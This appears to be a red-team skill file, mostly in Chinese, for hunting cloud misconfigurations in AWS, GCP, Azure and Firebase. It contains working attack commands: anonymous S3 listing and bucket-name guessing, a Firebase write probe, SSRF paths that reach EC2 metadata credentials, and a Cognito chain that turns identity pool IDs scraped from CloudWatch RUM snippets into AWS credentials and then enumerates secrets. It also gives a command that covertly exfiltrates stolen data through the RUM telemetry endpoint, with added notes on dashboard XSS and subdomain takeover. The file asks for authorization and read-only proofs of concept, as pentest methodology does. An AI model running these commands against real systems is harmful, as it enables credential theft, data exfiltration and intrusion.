---
name: hunt-cloud-misconfig
description: "猎取云 / 基础设施配置错误。AWS：公开的 S3 桶（s3:GetObject 匿名访问）、宽松的桶策略（PutObjectAcl 公开写入）、暴露的 CloudFront 源站、公开的 Lambda 函数 URL、公开的 RDS 快照、JS 包中的 IAM 凭据、可经 SSRF 访问的 AWS 元数据。GCP：公开的 GCS 桶、暴露的 Cloud Run 服务、泄露的服务账号 JSON。Azure：公开的 blob 容器、暴露的 Function App。（Kubernetes/Docker 暴露归 hunt-k8s 负责；CI/CD 流水线攻击归 hunt-cicd；取得凭据后的 IAM 提权归 cloud-iam-deep。）检测：定向 dorking、证书透明日志、JS 包密钥提取、对已知服务端口做端口扫描。验证：实际的数据读取 / 写入 / RCE。适用于猎取云原生存储与计算配置错误（S3/GCS/Blob、经 SSRF 访问 IMDS、无服务器、公开托管服务）。"
version: 1.1.0
revision_date: 2026-07-25
license: MIT
platforms: [linux]
metadata:
  tags: [cloud, misconfiguration, hunt, redteam]
  category: redteam
---

# HUNT-CLOUD-MISCONFIG — 云 / 基础设施配置错误

## When to Use

- 猎取云原生存储与计算配置错误（S3/GCS/Blob、经 SSRF 访问 IMDS、无服务器、公开托管服务）。

## Prerequisites

- 针对目标的明确授权、目标边界和速率限制。
- 工具：`aws-cli`、`curl`。
- 可写的证据目录：`export OUTPUT_DIR="${OUTPUT_DIR:-./output}" && mkdir -p "$OUTPUT_DIR"`。
- 对于任何改变状态的步骤（写入、上传、凭据尝试），在执行命令前立即取得明确确认。

## How to Run

```bash
# S3 listing
curl --max-time 30 --connect-timeout 10 -s "https://TARGET-NAME.s3.amazonaws.com/?max-keys=10"
aws s3 ls s3://target-bucket-name --no-sign-request

# Try common bucket names
for name in target target-backup target-assets target-prod target-staging; do
  curl --max-time 30 --connect-timeout 10 -s -o /dev/null -w "$name: %{http_code}\n" "https://$name.s3.amazonaws.com/"
done

# Firebase open rules
curl --max-time 30 --connect-timeout 10 -s "https://TARGET-APP.firebaseio.com/.json"   # read
curl --max-time 30 --connect-timeout 10 -s -X PUT "https://TARGET-APP.firebaseio.com/test.json" -d '"pwned"'  # write
```

## Procedure

以下各阶段即为操作流程。保持每次探测有界（`--max-time`），在 `OUTPUT_DIR` 下记录证据，并在 Pitfalls 中列出的停止条件处停止。

## 核心高价值目标

### S3 / GCS / Azure Blob
```bash
# S3 listing
curl --max-time 30 --connect-timeout 10 -s "https://TARGET-NAME.s3.amazonaws.com/?max-keys=10"
aws s3 ls s3://target-bucket-name --no-sign-request

# Try common bucket names
for name in target target-backup target-assets target-prod target-staging; do
  curl --max-time 30 --connect-timeout 10 -s -o /dev/null -w "$name: %{http_code}\n" "https://$name.s3.amazonaws.com/"
done

# Firebase open rules
curl --max-time 30 --connect-timeout 10 -s "https://TARGET-APP.firebaseio.com/.json"   # read
curl --max-time 30 --connect-timeout 10 -s -X PUT "https://TARGET-APP.firebaseio.com/test.json" -d '"pwned"'  # write
```

### EC2 元数据（经 SSRF）
```bash
http://169.254.169.254/latest/meta-data/iam/security-credentials/  # role name
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME  # keys
```

### 暴露的管理面板
```
/jenkins  /grafana  /kibana  /elasticsearch  /swagger-ui.html
/phpMyAdmin  /.env  /config.json  /api-docs  /server-status
```

---

## 本地验证工具链

用于在接触真实云环境之前或代替真实云环境，针对本地 AWS 模拟器验证云配置错误发现：

```bash
# LocalStack 3.0 community (pin the version — 4.x requires a Pro license)
docker run -d --name lab-localstack -p 14566:4566 localstack/localstack:3.0

# awscli ≥ 2.30 + LocalStack 3.0 incompatibility workaround (x-amz-trailer header):
export AWS_REQUEST_CHECKSUM_CALCULATION=when_required
export AWS_RESPONSE_CHECKSUM_VALIDATION=when_required
export AWS_ENDPOINT_URL=http://localhost:14566
export AWS_ACCESS_KEY_ID=test AWS_SECRET_ACCESS_KEY=test AWS_DEFAULT_REGION=us-east-1
```

若没有这些环境变量，`aws s3 cp/sync` 会因 `InvalidRequest` 失败。请向团队记录这一点。完整的可复现流程已在技能开发过程中针对 LocalStack 3.0 验证。

---

## CloudWatch RUM 武器化（2024-2026 攻击面）

AWS CloudWatch RUM（真实用户监控）是一项于 2021 年末推出的客户端遥测服务。客户在其页面上嵌入一段 JS 片段，将性能/错误事件发送到 `dataplane.rum.<region>.amazonaws.com`。该片段的 `AppMonitor` 配置包含 `identityPoolId`（Cognito）和 `guestRoleArn`（IAM 角色）—— 二者**按设计即为公开**。IAM 角色策略才是安全边界；当开发者将其配置得比文档规定的最小权限（对 AppMonitor ARN 的 `rum:PutRumEvents`）更宽时，整个身份池就变成了 `cloud-iam-deep` → Cognito Identity Pool 链路中所描述的未认证 AWS 凭据自动发放机。

### 检测 —— JS 包指纹

**片段式（最常见，嵌入在 `<head>` 中）：**
```javascript
(function(n,i,v,r,s,c,x,z){...})(
  'cwr',
  '00000000-0000-0000-0000-000000000000',                       // applicationId (UUID)
  '1.0.0',
  'us-east-1',
  'https://client.rum.us-east-1.amazonaws.com/1.x/cwr.js',
  {
    sessionSampleRate: 1,
    guestRoleArn: "arn:aws:iam::123456789012:role/RUM-Monitor-...-Unauth",
    identityPoolId: "us-east-1:abcd1234-...",
    endpoint: "https://dataplane.rum.us-east-1.amazonaws.com",
    telemetries: ["errors","performance","http"]
  }
);
```

**NPM 式（aws-rum-web 包）：**
```javascript
import { AwsRum, AwsRumConfig } from 'aws-rum-web';
const config: AwsRumConfig = { identityPoolId, endpoint, guestRoleArn, ... };
const awsRum = new AwsRum(APPLICATION_ID, '1.0.0', AWS_REGION, config);
```

### 侦察用正则集合

```bash
# Detect RUM init
grep -REn "cwr\(['\"]init['\"]|from\s+['\"]aws-rum-web['\"]|new\s+AwsRum\(" .

# Extract applicationId (UUID v4)
grep -Proh "applicationId['\"]?\s*[:=]\s*['\"]([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})['\"]" .

# Extract identityPoolId (region:UUID)
grep -Proh "identityPoolId['\"]?\s*[:=]\s*['\"]([a-z]{2}-[a-z]+-[0-9]+:[0-9a-f-]{36})['\"]" .

# Extract guestRoleArn (leaks AWS account ID + role name)
grep -Proh "guestRoleArn['\"]?\s*[:=]\s*['\"]arn:aws:iam::[0-9]{12}:role/[A-Za-z0-9._/-]+['\"]" .

# Endpoint reveals region
grep -ErohE "dataplane\.rum\.[a-z0-9-]+\.amazonaws\.com" .
```

### 攻击链

**链路 A —— 凭据提取（当 guestRole 权限过大时为严重）。** 一旦从页面中提取出 `identityPoolId`，任何人都可以运行：

```bash
aws cognito-identity get-id \
  --identity-pool-id "us-east-1:abcd1234-..." \
  --region us-east-1 --no-sign-request
aws cognito-identity get-credentials-for-identity \
  --identity-id "us-east-1:<returned-uuid>" \
  --region us-east-1 --no-sign-request
# → STS creds; export and:
aws sts get-caller-identity        # confirm role
aws s3 ls; aws dynamodb list-tables; aws lambda list-functions; aws ssm describe-parameters; aws secretsmanager list-secrets
# Automate: pacu / enumerate-iam.py
```

完整链路记录于 `cloud-iam-deep` → Cognito Identity Pool 未认证链路。RUM 只是常见的嵌入场景之一。

**链路 B —— 遥测端点隐蔽外带。** `dataplane.rum.<region>.amazonaws.com` 是**每个企业白名单中都存在的 AWS 自有域名**。`PutRumEvents` payload 接受任意的 `userDetails` 和 `customEvents` 字符串字段：

```bash
aws rum put-rum-events \
  --id $(uuidgen) \
  --app-monitor-details '{"id":"<appId>","version":"1.0.0"}' \
  --user-details '{"userId":"EXFIL_PAYLOAD_HERE","sessionId":"<session>"}' \
  --rum-events '[{"id":"'$(uuidgen)'","timestamp":'$(date +%s)',"type":"com.amazon.rum.custom_event","details":"{\"exfil\":\"<base64 of stolen data>\"}"}]' \
  --endpoint-url "https://dataplane.rum.us-east-1.amazonaws.com" \
  --region us-east-1
```

监控出口流量的防御方看到的是发往已知良好 AWS 主机名的流量；DLP 不会解析 JSON 请求体；SIEM 规则通常也不会摄取客户的 RUM 遥测数据。

**链路 C —— 通过污染片段来源实施 DOM 注入。** 许多客户要么在自己的 CDN 上自托管 `cwr.js`（`assets.target.com/cwr.js`），要么打包 `aws-rum-web` 并从 `static.target.com/main.<hash>.js` 提供。JS 主机上的子域接管或供应链沦陷（针对 `aws-rum-webb` 的 npm 域名抢注）即可在每次页面加载时获得持久的 JS 执行能力，并享有 `aws-rum-web` SDK 的信任 —— 包括其已获得的 Cognito 权限。

**链路 D —— 遥测注入 / 仪表盘投毒。** 借助公开的 `identityPoolId` + `applicationId`，外部攻击者可以向 `PutRumEvents` 灌入伪造的错误尖峰（淹没真实告警）、向页面 URL 遥测中注入 SOC 分析师查看 CloudWatch 仪表盘时触发的 XSS payload，并虚增计费的 RUM 事件数（经济型 DoS）。

### 严重性评级标准

| 发现项 | 严重性 | 判定依据 |
|---|---|---|
| `guestRoleArn` 具有 `*:*` 或跨多个服务的通配符 | **严重**（9.1+） | 匿名获得完整 AWS 访问权限 |
| `guestRoleArn` 在生产资源上具有 `s3:*`、`dynamodb:*`、`secretsmanager:*`、`lambda:Invoke*` | **高**（7.5-8.8） | 视资源而定为数据外带 / RCE |
| `guestRoleArn` 具有 `cognito-identity:*` 或 `iam:PassRole` | **高**（8.0） | 权限提升原语 |
| `guestRoleArn` 仅具有 `rum:PutRumEvents` + 端点范围限定的资源 | **信息性** | 文档所述、预期配置 |
| RUM `userDetails` 将 PII 记录到 CloudWatch 控制台可见的事件中 | **中**（5.3-6.5） | 通过仪表盘共享导致敏感数据暴露 |
| RUM AppMonitor 接受来自任意互联网来源的 `PutRumEvents`（遥测注入） | **低-中**（4.3） | 仪表盘投毒、告警规避、计费 DoS |
| 在可被接管的子域上自托管 `cwr.js` | 链式利用时**严重**（9.8） | 跨每个客户页面的持久存储型 XSS |

### 已披露案例 / 权威文章

截至 2026-05，尚无专门针对 AWS RUM 分配的 CVE。该攻击类别已在研究中记录，但公开 hacktivity 中针对 RUM 的具体具名赏金支付很少见。该模式是"Cognito 身份池因嵌入 SDK 而权限过大" —— RUM 只是其中一种常见嵌入方式。

- **Andres Riancho — "Misconfigured Cognito Identity Pools"（2020/2023）** —— 确立了该攻击类别。[andresriancho.com](https://andresriancho.com/identity-pools-and-the-default-iam-role-trap/)
- **Rhino Security Labs — Pacu `cognito__enum_identity_pools`** —— 自动化链路 A 的生产级工具。[github.com/RhinoSecurityLabs/pacu](https://github.com/RhinoSecurityLabs/pacu)
- **NotSoSecure / Claranet — "Exploiting weak configurations in Amazon Cognito"（2023 年 11 月）** —— 明确指出 RUM 是三种常见泄露身份池 ID 的 SDK 之一。[notsosecure.com](https://www.notsosecure.com/exploiting-weak-configurations-in-amazon-cognito/)
- **HackTricks Cloud — `aws-cognito-unauthenticated-enum`** —— 标准 playbook。[cloud.hacktricks.wiki](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-unauthenticated-enum-access/aws-cognito-unauthenticated-enum.html)
- **Datadog Security Labs — "Following AWS Logs Backwards: Cognito Identity Pool Abuse"（2024）** —— 展示真实世界滥用率的遥测数据。[securitylabs.datadoghq.com](https://securitylabs.datadoghq.com/articles/abusing-aws-cognito-misconfigurations/)
- **aws-observability/aws-rum-web GitHub issues #213、#404** —— 关于捆绑片段安全模型的社区讨论。[github.com/aws-observability/aws-rum-web](https://github.com/aws-observability/aws-rum-web/issues)

### 验证清单（报告之前）

1. 从页面源码中提取 `identityPoolId`。
2. 确认该身份池允许未认证身份（`get-id` 在无认证情况下成功）。
3. 确认 `get-credentials-for-identity` 返回 STS 凭据。
4. 运行 `aws sts get-caller-identity` 并**截图角色 ARN**。
5. 运行 `enumerate-iam` / Pacu `iam__enum_permissions` —— 至少捕获一个超出 `rum:PutRumEvents` 的允许动作。没有这一点，该发现仅为信息性。
6. 对真实资源演示至少一次读取/列举（S3 桶列表、DynamoDB 扫描、Lambda 调用）。
7. **不要**修改/删除数据，即使权限允许 —— 仅做只读 PoC。

---

## Pitfalls

- **无读取权限的 S3 桶列举** —— 发现一个可列举的桶属于侦察，而非漏洞。需要证明存在可读取的、含敏感内容的对象。
- **无敏感数据的 Firebase 公开读取** —— 仅含公开应用配置的开放 Firebase RTDB 属于信息性。需要 PII、凭据或内部数据。
- **无凭据影响的 GCP/Azure 存储** —— 仅含静态资源的公开 blob 存储不构成发现。需要密钥、源代码或客户数据。
- **可从外部访问的云元数据端点** —— 对 169.254.169.254 的 SSRF 只能从云内部利用。外部可直接访问元数据是另一类（且更严重）的发现。
- **桶 ACL 配置错误与策略配置错误** —— 桶策略和 ACL 是不同的机制。在得出桶为公开的结论前，两者都要测试。
- **CloudFront/Cloudflare CDN 源站泄露** —— 绕过 CDN 到达源站属于侦察，直到你证明存在不同之处（调试端点、无认证访问）。
- **不受限的云函数触发器** —— 可公开调用的函数可能是有意设计。需要证明该函数执行了敏感操作（数据访问、资源修改）。

---

## Verification

1. **S3 桶探测** —— 确认 AWS CLI 或 curl 的桶语法：
   ```bash
   echo "https://bucket-name.s3.amazonaws.com/" | grep -q "s3.amazonaws.com" && echo "PASS" || echo "FAIL"
   ```
2. **Firebase RTDB 探测** —— 确认 Firebase URL 语法：
   ```bash
   echo "https://project-id.firebaseio.com/.json" | grep -q "firebaseio.com" && echo "PASS" || echo "FAIL"
   ```
3. **云元数据端点** —— 确认元数据 IP 可被识别：
   ```bash
   echo "169.254.169.254" | grep -q "169.254.169.254" && echo "PASS: metadata IP recognized" || echo "FAIL"
   ```
全部 3 项测试用于验证云配置错误的探测能力。

---

## 相关技能与链路

- **`hunt-subdomain`** —— 指向已删除桶的陈旧 CNAME 是接管的金矿。链路原语：云配置错误（S3 公开/已删除）+ `hunt-subdomain` → 未被认领的 CNAME 指向该桶 → 接管 `assets.target.com`。
- **`cloud-iam-deep`** —— 公开桶中泄露的 SA JSON / AWS 密钥只是问题的一半。链路原语：公开 S3 + `.env` 中泄露的 AWS 密钥 → `cloud-iam-deep` 枚举 → 跨服务 `iam:PassRole` 提权。
- **`hunt-ssrf`** —— 元数据服务仅可从 VPC 内部访问；SSRF 是桥梁。链路原语：SSRF + 云配置错误（仍启用 IMDSv1）→ 实例角色密钥 → 读取 S3/RDS 数据。
- **`supply-chain-attack-recon`** —— 暴露的 CI/CD 端点与 SBOM 会泄露内部包名。链路原语：暴露的 Jenkins/GitLab + 内部包名泄露 → npm/PyPI 依赖混淆发布 → CI 构建沦陷。
- **`security-arsenal`** —— 载入 Cloud Bucket Wordlist（target-prod / target-backup / target-staging 排列）以及 Admin-Panel Path List 以便快速枚举。
- **`triage-validation`** —— 应用唯一标记门：任何"可写桶"的断言都要求在提交报告前写入一个唯一标记文件，并从干净会话中回读验证。
